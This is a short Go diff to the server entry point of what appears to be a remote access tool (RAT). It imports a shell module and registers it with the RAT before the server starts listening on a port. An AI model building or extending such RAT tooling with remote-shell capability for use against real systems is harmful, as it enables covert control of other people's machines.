@@ -10,6 +10,7 @@ import (
 	"strings"
 	"time"
 
+	"server/internal/mod/shell"
 	"server/internal/rat"
 	"server/internal/utility"
 )
@@ -30,7 +31,12 @@ func main() {
 
 	logger := utility.NewLogQue(os.Stdout, time.Stamp)
 	rat := rat.NewRAT(logger)
-	err := rat.Startup(*port)
+	err := rat.Register(shell.New(logger))
+	if err != nil {
+		logger.Panic(err)
+	}
+
+	err = rat.Startup(*port)
 	if err != nil {
 		logger.Fatal(err)
 	}
